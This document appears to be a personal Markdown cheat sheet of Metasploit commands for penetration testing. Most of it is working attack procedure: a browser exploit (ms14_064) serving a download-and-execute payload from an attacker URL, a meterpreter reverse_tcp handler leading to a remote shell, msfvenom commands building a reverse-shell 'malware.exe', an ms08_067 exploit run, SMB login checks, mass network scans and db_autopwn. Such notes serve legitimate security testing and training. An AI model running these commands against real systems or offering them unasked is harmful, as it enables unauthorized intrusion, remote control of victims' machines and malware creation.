# Metasploit memos
## Single
  - Update
    ~~~
    msfupdate
    # msfupdate -> will be not supported
    git fetch
    ~~~
  
  - Search
    ~~~
    msf> search cve:2014 type:exploit app:client
    ~~~

  - Use attack module(sample)
    - Base
      ~~~
      ## terminal 1(setting malware)
      msf> use exploit/windows/browser/ms14_064_ole_code_execution
      msf exploit(ms14_064_ole_code_execution)> show options
      msf exploit(ms14_064_ole_code_execution)> set SRVHOST [Attacker IP address]
      msf exploit(ms14_064_ole_code_execution)> set SRVPORT [Attacker Port]
      msf exploit(ms14_064_ole_code_execution)> set URIPATH /ie
      # Set Payload
      msf exploit(ms14_064_ole_code_execution)> set PAYLOAD windows/download_exec
      # Configuration
      msf exploit(ms14_064_ole_code_execution)> set show options
      msf exploit(ms14_064_ole_code_execution)> set URL http://[attacker IP]:[attacker port]/[filename].exe
      msf exploit(ms14_064_ole_code_execution)> set EXE [filename].exe
      # Running
      msf exploit(ms14_064_ole_code_execution)> exploit
      
      ## terminal 2(handler)
      msf> use exploit/multi/handler
      msf exploit(handler)> set PAYLOAD windows/meterpreter/reverse_tcp
      msf exploit(handler)> set LHOST [Attacker IP address]
      msf exploit(handler)> set LPORT [Attacker Port]
      msf exploit(handler)> exploit
      # connected from malware
      # show target information
      meterpreter> sysinfo
      # get CommandLine
      meterpreter> shell
      ...
      C:\[path]> 
      ~~~
    
    - Save
      ~~~
      save
      ~~~
      
    - Check exploit using nmap nse
      - Ref  
        https://nmap.org/book/man-nse.html
      - Commands
        ~~~
        nmap -sT -O --script=smb-check-vulns -P0 [Target IP]
        ~~~

    - Search opened outbound port
      ~~~
      set payload windows/meterpreter/reverse_tcp_allports
      ~~~

  - Import xml file of the nmap result
    ~~~
    # Import
    db_import [xml file]
    
    ## import check
    #  list up target addresses
    #  if ip addresses displayed, file import is succeeded
    hosts -c address
    ~~~

  - Discover Host and Scan
    - Discover Idling Host and Idle Scan
      ~~~
      ## metasploit module
      use auxiliary/scanner/ip/ipidseq
      #(if needs)show options
      set RHOSTS [Target IP addresses ex)192.168.0.0/24]
      set THREADS 50
      run
      
      ## nmap
      nmap -Pn -sI [Discovered Target]
      db_nmap -Pn -sI [Discovered Target]

      ## check the result of nmap imported
      services
      ~~~

    - Port Scan
      ~~~
      use auxiliary/scanner/portscan/syn
      set RHOSTS [Target IP address]
      set THREADS 50
      run
      ~~~

    - SMB scan
      - Research
        ~~~
        use auxiliary/scanner/smb/smb_version
        #(if you needs)show options
        set RHOSTS [Target IP address]
        run
        
        # show scan result
        hosts -c address,os_flavor,svcs,vulns,workspace
        ~~~

      - Verify Login  
        ~~~
        use auxiliary/scanner/smb/smb_login
        set RHOSTS [Target IP]
        # if you need, specific username
        set SMBUser [User name]
        # if you need, specific password
        set SMBPass [Password]
        run
        ~~~

    - VNC scan
      - Search
        ~~~
        use auxiliary/scanner/vnc/vnc_none_auth
        set RHOSTS [Target IP]
        ~~~
      - Verify
        ~~~
        vncviewer
        ~~~

    - X11 scan
      - Search
        ~~~
        use auxiliary/scanner/x11/open_x11
        set RHOSTS [Target IP]
        set THREADS 50
        run
        ~~~
      - Verify
        ~~~
        xspy
        ~~~

    - Search vulnerable MS SQL Server
      ~~~
      use auxiliary/scanner/mssql/mssql_ping
      set RHOSTS 192.168.24.0/24
      set THREADS 255
      run
      ~~~

    - Search SSH Server
      ~~~
      use auxiliary/scanner/ssh/ssh_version
      set RHOSTS 192.168.24.0/24
      set THREADS 50
      run
      ~~~

    - FTP scan
      ~~~
      use auxiliary/scanner/ftp/ftp_version
      set RHOSTS 192.168.24.0/24
      set THREADS 50
      run
      ~~~
      
      - check available anonymous ftp
        ~~~
        use auxiliary/scanner/ftp/anonymous
        set RHOSTS 192.168.24.0/24
        set THREADS 50
        run
        ~~~

    - SNMP sweep
      ~~~
      use auxiliary/scanner/snmp/snmp_login
      set RHOSTS 192.168.24.0/24
      set THREADS 50
      run
      ~~~
  - Automated
    - Create resource file
      ~~~
      # sample
      version
      load sounds
      ~~~

## msfvenom
  Create malware connect to attacker's machine using reverse_tcp  
  ~~~
  # msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=[my(attacker's) ip addr] LPORT=[my port] -f exe -o malware.exe
  # msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.11.0.96 LPORT=9090 -f exe -o m.exe
  ~~~

## msfcli(main: test/dev module)
  ~~~
  ## show Options - use "O" option
  # msfcli windows/smb/ms08_067_netapi O

  ## show available payload - use "P" option
  # msfcli windows/smb/ms08_067_netapi RHOST=192.168.0.1 P

  ## exploit - use "E" option
  # msfcli windows/smb/ms08_067_netapi RHOST=192.168.0.1 PAYLOAD=windows/shell/bind_tcp E
  ~~~

## msfpayload
  ~~~
  ## show utility options
  # msfpayload -h

  ## show payload options
  # msfpayload windows/shell_reverse_tcp O
  ~~~
  
## msfencode
  ~~~
  ## show lits of encoder
  # msfencode -l
  ~~~

## NASM shell
  ~~~
  ## show opecode
  # ./tools/nasm_shell.rb
  nasm > jmp esp
  00000000 FFE4     jmp esp
  ~~~

## Combination with other Programs
  - Armitage(GUI for Metasploit)
    ~~~
    # armitage
    ~~~

  - Nexpose
    - Ref  
      https://blog.rapid7.com/2014/06/11/kali-for-ya/

    - Commands
      ~~~
      load nexpose
      nexpose_connect [Username]:[Password]@[Server IP]:[Port] <ssl-confirm>
      # ex) nexpose_connect user:pass@localhost:3780 ok
      nexpose_scan [Target IP]
      # ex) nexpose_scan localhost
      # show scan result
      hosts -c address,svcs,vulns,workspace
      # show discovered vulnerability
      vulns
      ~~~

  - Nessus
    - Ref
      - Install  
        http://d.hatena.ne.jp/ozuma/20140421/1398085995  
        https://www.tenable.com/blog/installing-and-using-nessus-on-kali-linux
      - Download Installer  
        https://www.tenable.com/products/nessus/select-your-operating-system
      - License  
        https://www.tenable.com/products/nessus-home
    - Commands
      ~~~
      ## If scan using Web UI
      # Create new db
      db_connect [Username]:[Password]@[Server IP]:[Port]/msf4
      # Import the scanned result
      db_import [File]
      ## ex) db_import /tmp/nessus_report_Host_195.nessus
      # show the imported result
      hosts -c address,svcs,vulns
      # show discovered vulnerability
      vulns
      
      ## On Metasploit
      # show target information
      hosts -d
      load nessus
      nessus_connect [Username]:[Password]@[Server IP]:[Port] <ssl-confirm>
      # ex) nexpose_connect user:pass@localhost:3780 ok
      # show scan policy
      nessus_policy_list
      # Scan
      nessus_scan_new [Policy ID] [Scan Name] [Target IP]
      # ex) nexpose_scan 1 sample_scan localhost
      # show scan status
      nessus_scan_status
      # show report list
      nessus_report_list
      # Import nessus scan report
      nessus_report_get [Report ID]
      # show scan result
      hosts -c address,svcs,vulns,workspace
      # show discovered vulnerability
      vulns       
      ~~~

  - Autopwn
    example, Import the result of nessus and 
    ~~~
    # Import nessus result
    db_connect [username]:[password]@[ip address]:[port]/msf4
    db_import [path to nbe]
    # run pwn
    db_autopwn -e -t -r -x -p
    ~~~



